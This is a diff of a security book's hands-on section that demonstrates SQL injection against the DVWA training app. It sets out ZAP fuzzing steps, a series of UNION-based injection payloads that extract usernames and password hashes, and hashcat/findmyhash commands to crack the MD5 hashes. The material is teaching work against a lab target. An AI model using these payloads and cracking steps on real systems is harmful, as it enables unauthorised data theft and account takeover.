@@ -213,7 +213,7 @@ _Todo_
 
 ![](images/HandsOnHack.png)
 
- One of the simplest and quickest vulnerabilities to fix, yet it is still top of the hit lists. I am going to hammer this home some more.
+ One of the simplest and quickest vulnerabilities to fix is SQL Injection, yet it is still top of the hit lists. I am going to hammer this home some more.
 
 I> ## Synopsis
 I>
@@ -234,72 +234,74 @@ G> Navigate to the SQL Injecton page and enter `1` in the input box.
 G>
 G> In Zap: Right click on dvwa -> Attack -> Active Scan -> Start Scan
 G>
-G> When the scan is finished: go to the Alerts tab -> Select SQL Injection -> look at the request and response.  
+G> When the scan has finished: go to the Alerts tab -> Select SQL Injection -> look at the request and response.  
 G> See Zap used a union query, but response said "The used SELECT statements have a different number of columns". Which means if we use the correct number of columns we will have success.  
 G>
 G> In Request tab, select input parameter -> right click and select Fuzz -> Payloads -> Add -> Select File Fuzzers from "Type" dropdown. jbrofuzz->SQL Injection->SQL Injection -> Add -> OK -> Start Fuzzer
 G>
-G> Notice the `x' or full_name like '%bob%` in the Fuzzer tab.
+G> Notice the `x' OR full_name LIKE '%bob%` in the Fuzzer tab?
 G>
 G> Then try the following in dvwa input:
 G>
-G> `x' or full_name like '%bob%`  
+G> `x' OR full_name LIKE '%bob%`  
 G> Output: Tells us we are in a where clause and I had an unknown column name.  
 G> Thanks MySQL error reporting!
 G>
-G> `x' or first_name like '%bob%`     # This works  
-G> `x' or last_name like '%smith%`    # This works  
-G> `x' or first_name like '%`         # And as expected, we get what we think are all users.
+G> Try the following queries:
+G> `x' OR first_name LIKE '%bob%`     # This works  
+G> `x' OR last_name LIKE '%smith%`    # This works  
+G> `x' OR first_name LIKE '%`         # And as expected, we get what we think are all users.
 G>
 G> Also the recon stage may tell us a lot about naming conventions and more. Once you know who the employees are:  
 G> Search stackoverflow, github, etc for tidbits. Also [gitrob](https://github.com/michenriksen/gitrob)  
-G> As we try different things, we learn more about naming conventions.
+G> As we try different things, we learn more about naming conventions.  
+G> You may also be able to find out about the target organisations naming conventions by looking around the internet. Github, Bitbucket, Stackoverflow and many other sites usually yield useful information.
 G>
-G> `x' or user like '%`               # This works  
+G> `x' OR user LIKE '%`               # This works  
 
 {icon=bomb}
 G>
 G> I thought the query on the server looked something like this:
-G> `select ID, first_name, last_name from users where ID = ''`
+G> `SELECT ID, first_name, last_name FROM users WHERE ID = ''`
 G>
 G> Time to work out what the table name is.
 G>
 G> Lets try users. I'm thinking that the full query will look like:  
-G> `select ID, first_name, last_name from users where ID = '1' union select ID, first_name, last_name from users where first_name like '%'`  
-G> Injected query:  
-G> `1' union select ID, first_name, last_name from users where first_name like '%`  
+G> `SELECT ID, first_name, last_name FROM users WHERE ID = '1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%'`  
+G> Inject query:  
+G> `1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%`  
 G> Output: Unknown column 'ID'  
 G> Lets fix that:  
-G> `1' union select user_id, first_name, last_name from users where first_name like '%`  
-G> Output: The used SELECT statements have a different number of columns.  
+G> `1' UNION SELECT user_id, first_name, last_name FROM users WHERE first_name LIKE '%`  
+G> Output: "The used SELECT statements have a different number of columns"  
 G> This told me that the query on the server was slightly different to what I thought. My revised guess of the full query:  
-G> `select first_name, last_name from users where user_id = '1' union select first_name, last_name from users where first_name like '%'`  
-G> Injected query:  
-G> `1' union select first_name, last_name from users where first_name like '%`
+G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%'`  
+G> Inject query:  
+G> `1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%`
 G>
 G> Now for the passwords:  
 G> Full server query guess:  
-G> `select first_name, last_name from users where user_id = '1' union select first_name, password from users where first_name like '%'`  
-G> Injected query:  
-G> `1' union select first_name, password from users where first_name like '%`
+G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%'`  
+G> Inject query:  
+G> `1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%`
 G>
 G> Lets determine the hash type with hash-identifier. Just run it and throw the hash at it and it will tell you that it is most likely a simple MD5. which is a one-way hashing function with no Key derivation. So very quick to crack.
 G>
 G> So take your pick of the following two commands:  
 G> Create `./hashtocrack.txt` and put the hash(s) you want cracked in it. If you still have the wordlist we created in the [Brute Forcing](#people-identify-risks-weak-password-strategies-brute-forcing-hydra) section in the People chapter, just use it.  
 G> `hashcat -m 0 ./hashtocrack.txt ./wordlist-to-throw-at-dvwa`  
-G> `[algorithm]` in this case will be `MD5`
-G> `findmyhash [algorithm] -h <hash_value>`
+G> `[algorithm]` for next command in this case will be `MD5`  
+G> `findmyhash [algorithm] -h <hash_value>`  
 G> `-m 0` means MD5 to hashcat.  
 G> This gives us the super secure password of "admin"
 G>
 G> In order to get login, we actually need the username. In this case they were the same, but for some other users they were not. So our last query.  
 G> Full server query guess:  
-G> `select first_name, last_name from users where user_id = '1' union select user, password from users where first_name like '%'`  
-G> Injected query:  
-G> `1' union select user, password from users where first_name like '%`  
+G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users WHERE first_name LIKE '%'`  
+G> Inject query:  
+G> `1' UNION SELECT user, password FROM users WHERE first_name LIKE '%`  
 G> Or simplified:  
-G> `1' union select user, password from users#'`
+G> `1' UNION SELECT user, password FROM users#'`
 G> Now we have our admin password and user.
 
 There are two main problems here.
